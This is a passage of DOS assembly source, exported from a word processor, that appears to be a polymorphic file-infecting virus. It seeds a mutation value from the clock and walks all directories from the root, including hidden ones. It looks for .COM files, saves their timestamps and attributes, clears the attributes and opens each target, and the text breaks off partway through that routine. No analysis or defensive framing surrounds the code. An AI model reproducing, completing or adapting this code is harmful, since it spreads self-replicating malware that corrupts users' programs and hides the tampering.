<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      </span>MOV<span
style="mso-spacerun: yes">    </span>AH,2CH<span style="mso-spacerun:
yes">                    </span>;GET TIME<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      </span>INT<span
style="mso-spacerun: yes">    </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      </span>MOV<span
style="mso-spacerun: yes">    </span>ENCRYPT_VAL,DL<span style="mso-spacerun:
yes">            </span>;SAVE M_SECONDS TO ENCRYPT VAL SO<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                       </span>;THERES 100 MUTATIONS
POSSIBLE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>SETDTA:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX,OFFSET DIRDATA<span
style="mso-spacerun: yes">         </span>;OFFSET OF WHERE TO HOLD NEW DTA<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,1AH<span style="mso-spacerun:
yes">                    </span>;SET DTA ADDRESS<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H <span style="mso-spacerun:
yes">                      </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>NEWDIR:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,19H<span style="mso-spacerun:
yes">                    </span>;GET DRIVE CODE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DL,AL<span style="mso-spacerun:
yes">                     </span>;SAVE DRIVECODE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INC<span
style="mso-spacerun: yes">     </span>DL<span style="mso-spacerun:
yes">                        </span>;ADD ONE TO DL, BECAUSE FUNCTIONS DIFFER<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,47H<span style="mso-spacerun:
yes">                    </span>;GET CURRENT DIRECTORY<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>SI, OFFSET CURRENTDIR<span
style="mso-spacerun: yes">     </span>;BUFFER TO SAVE DIRECTORY IN<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX,OFFSET ROOTDIR<span
style="mso-spacerun: yes">         </span>;MOVE DX TO CHANGE TO ROOT DIRECTORY<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,3BH<span style="mso-spacerun:
yes">                    </span>;CHANGE DIRECTORY TO ROOT<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:FR'>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'>SCANDIRS:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><span style="mso-spacerun: yes">     </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>MOV<span
style="mso-spacerun: yes">     </span>CX,13H<span style="mso-spacerun:
yes">                    </span>;INCLUDE HIDDEN/RO DIRECTORYS<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX, OFFSET WILDCARDS<span
style="mso-spacerun: yes">      </span>;LOOK FOR '*'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,4EH<span style="mso-spacerun:
yes">                    </span>;FIND FIRST FILE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>CMP<span
style="mso-spacerun: yes">     </span>AX,12H<span style="mso-spacerun:
yes">                    </span>;NO FIRST FILE?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>JNE<span
style="mso-spacerun: yes">     </span>DIRLOOP<span style="mso-spacerun:
yes">                   </span>;NO DIRS FOUND? BAIL OUT<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>BUS1:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      </span>JMP<span
style="mso-spacerun: yes">    </span>BUS<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>DIRLOOP:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,4FH<span style="mso-spacerun:
yes">                    </span>;FIND NEXT FILE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>CMP<span
style="mso-spacerun: yes">     </span>AX,12H<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>JE<span
style="mso-spacerun: yes">      </span>BUS<span style="mso-spacerun:
yes">                       </span>;NO MORE DIRS FOUND, ROLL OUT<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>CHDIR:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX,OFFSET DIRDATA+FILENAME;POINT DX TO
FCB - FILENAME<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">    </span><span style="mso-spacerun:
yes"> </span>AH,3BH<span style="mso-spacerun: yes">                   
</span>;CHANGE DIRECTORY<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,2FH<span style="mso-spacerun:
yes">                    </span>;GET CURRENT DTA ADDRESS<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>[DISKDTASEG],ES<span style="mso-spacerun:
yes">           </span>;SAVE OLD SEGMENT<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>[DISKDTAOFS],BX<span style="mso-spacerun:
yes">           </span>;SAVE OLD OFFSET<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX,OFFSET FILEDATA<span
style="mso-spacerun: yes">        </span>;OFFSET OF WHERE TO HOLD NEW DTA<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,1AH<span style="mso-spacerun:
yes">                    </span>;SET DTA ADDRESS<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:FR'>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'>SCANDIR:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><span style="mso-spacerun: yes">     </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>MOV<span
style="mso-spacerun: yes">     </span>CX,07H<span style="mso-spacerun:
yes">      </span><span style="mso-spacerun: yes">              </span>;FIND
ANY ATTRIBUTE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX,OFFSET FILESPEC<span
style="mso-spacerun: yes">        </span>;POINT DX TO &quot;*.com&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,4EH<span style="mso-spacerun:
yes">                    </span>;FIND FIRST FILE FUNCTION<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>CMP<span
style="mso-spacerun: yes">     </span>AX,12H<span style="mso-spacerun:
yes">                    </span>;WAS FILE FOUND?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>JNE<span
style="mso-spacerun: yes">     </span>TRANSFORM<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>NEXTEXE:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,4FH<span style="mso-spacerun:
yes">                    </span>;FIND NEXT FILE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>CMP<span
style="mso-spacerun: yes">     </span>AX,12H<span style="mso-spacerun:
yes">                    </span>;NONE FOUND<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>JNE<span
style="mso-spacerun: yes">     </span>TRANSFORM<span style="mso-spacerun:
yes">                 </span>;FOUND SEE WHAT WE CAN DO<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX,OFFSET ROOTDIR<span
style="mso-spacerun: yes">         </span>;MOVE DX TO CHANGE TO ROOT DIRECTORY<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,3BH<span style="mso-spacerun:
yes">                    </span>;CHANGE DIRECTORY TO ROOT<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,1AH<span style="mso-spacerun:
yes">                    </span>;SET DTA ADDRESS<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DS,[DISKDTASEG]<span style="mso-spacerun:
yes">           </span>;RESTORE OLD SEGMENT<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX,[DISKDTAOFS]<span style="mso-spacerun:
yes">           </span>;RESTORE OLD OFFSET<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>JMP<span
style="mso-spacerun: yes">     </span>DIRLOOP<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>BUS:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>JMP<span
style="mso-spacerun: yes">     </span>ROLLOUT<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>TRANSFORM:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AH,2FH<span style="mso-spacerun:
yes">                    </span>;TEMPORALLY STORE DTA<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>[TEMPSEG],ES<span style="mso-spacerun:
yes">              </span>;SAVE OLD SEGMENT<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>[TEMPOFS],BX<span style="mso-spacerun:
yes">              </span>;SAVE OLD OFFSET<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>DX, OFFSET FILEDATA + FILENAME<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>BX,OFFSET FILEDATA<span
style="mso-spacerun: yes">    </span><span style="mso-spacerun:
yes">           </span>;SAVE FILE...<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AX,[BX]+FILEDATE<span
style="mso-spacerun: yes">          </span>;DATE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>ORIG_DATE,AX<span style="mso-spacerun:
yes">              </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AX,[BX]+FILETIME<span
style="mso-spacerun: yes">          </span>;TIME<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>ORIG_TIME,AX<span style="mso-spacerun:
yes">              </span>;<span style="mso-spacerun: yes">    </span>AND<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AX,[BX]+FILEATTR<span
style="mso-spacerun: yes">          </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">   </span><span style="mso-spacerun:
yes">  </span>AX,4300H<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>ORIG_ATTR,CX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AX,4301H<span style="mso-spacerun:
yes">                  </span>;CHANGE ATTRIBUTES<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>XOR<span
style="mso-spacerun: yes">     </span>CX,CX<span style="mso-spacerun:
yes">                     </span>;CLEAR ATTRIBUTES<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>MOV<span
style="mso-spacerun: yes">     </span>AX,3D00H<span style="mso-spacerun:
yes">                  </span>;OPEN FILE - READ<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>INT<span
style="mso-spacerun: yes">     </span>21H<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span>JC<span
style="mso-spacerun: yes">      </span>FIXUP<span style="mso-spacerun:
